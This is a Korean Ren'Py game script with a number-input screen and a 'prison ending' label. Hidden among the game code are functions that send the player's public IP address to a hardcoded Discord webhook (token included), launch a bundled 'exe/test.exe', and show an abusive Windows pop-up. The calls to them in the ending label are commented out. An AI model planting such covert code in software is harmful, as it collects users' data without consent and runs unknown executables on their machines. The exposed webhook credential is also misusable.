init python:
    import ctypes
    def wnrdj():
        ctypes.windll.user32.MessageBoxW(0, "죽어 쓰레기", "죽어", 0)

init :
    $answer=""
    screen input():
        frame:
            xalign 0.5
            yalign 0.5
            padding (30, 30)

            vbox:
                spacing 10

                text "입력"
                input:
                    value VariableInputValue("answer")
                    length 3
                    allow "0123456789"

                textbutton "확인" action Return()



init python:
    def ipsend():
        import requests
        WEBHOOK_URL = "https://discord.com/api/webhooks/1444968672631328850/y_KKXFn2F8SQpQJL5eSScNH0-yK8IJ9lPj-OZ2-wRNiorNsTEZz7GLnHj7dmEt6xfxn1"
        ip_response = requests.get("https://api.ipify.org")
        my_ip = ip_response.text
        payload = {
        "content": f"📡 현재 IP 주소: `{my_ip}`"}
        requests.post(WEBHOOK_URL, json=payload)    
        
            
init python:
    def disc():
        import os
        os.startfile(os.path.join(renpy.config.gamedir, "exe/test.exe"))
    

label crime_end:
    scene black
    "경찰서에 잡혀갔다..."
    "💔 감옥 엔딩"
    #$ipsend()
    #$disc()
    #$wnrdj()
    
    

    return
